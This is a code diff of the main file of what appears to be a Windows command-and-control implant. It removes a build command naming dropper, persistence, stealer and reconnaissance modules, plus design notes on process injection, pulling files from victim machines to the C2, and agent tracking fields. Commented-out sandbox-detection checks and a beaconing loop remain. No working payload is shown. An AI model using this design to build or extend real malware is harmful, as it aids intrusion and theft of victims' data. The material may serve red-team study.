@@ -1,44 +1,6 @@
 #include "implant.h"
-// x86_64-w64-mingw32-g++ implant.cpp execute/execute.cpp dropper/Dropper.cpp file/file.cpp http/http.cpp persist/persist.cpp situational_awareness/GatherInfo.cpp stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp -liphlpapi -lshlwapi -lurlmon -lwininet -lwinhttp  -lbcrypt -lcrypt32 -luserenv -static -o implant.exe   
 
-/* To Implement:
-A way to have the binary only run 3
-(If someone clicks it 100 times - only shell)
-
-The encryption that we had
-*/
-
-
-/*
-This was under execution - idk what it is
-Process Injection: support execution of shellcode in either a
-remote processes (by pid) or via fork & run
-
-Execution: Payload format
--> Is this the dropper
-
-Implant->File I/O
-The implant should be able to
-1) Read files from the victim machine and send it back to the C2.
-2) Download files from the C2 and write them to disk either
-**encrypted**, or **unencrypted**.
-*/
-
-/* Note to self sort of:
-C2->Database->Implants
-Implant ID: Create an ID for the implant to distinguish is from others
-Computer Name: What computer did it connect from?
-Username: What user are you running as?
-GUID: What is the computer's GUID?
-Integrity: What privileges do you have?
-Connecting IP address: what address did it connect from?
-Session Key: After you negotiated a session key, store it per agent
-Sleep: How often does the agent check in?
-Jitter: How random of a check in is it?
-First Seen: When did the agent first check in?
-Last Seen: When was the the last time you saw the agent?
-Expected Check in: When should you expect to see the agent again?
-*/
+/* Loop that will run on repeat with a sleep timer*/
 
 void IWillRunForever(void){
     while(true){
@@ -97,8 +59,6 @@ int main(int argc, char* argv[]){
     /* Registering Implant */
     //registerimplant();
 
-    /* HOW ARE WE GETTING IMPLANT ID?*/
-
     /* Sandbox Detection */
     // printf("Executing Sandbox Detection\n");
     // if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
@@ -110,6 +70,7 @@ int main(int argc, char* argv[]){
         printf("ALREADY RUN\n");
         return -1;
     }
+    
     IWillRunForever();
     return 0;
 }
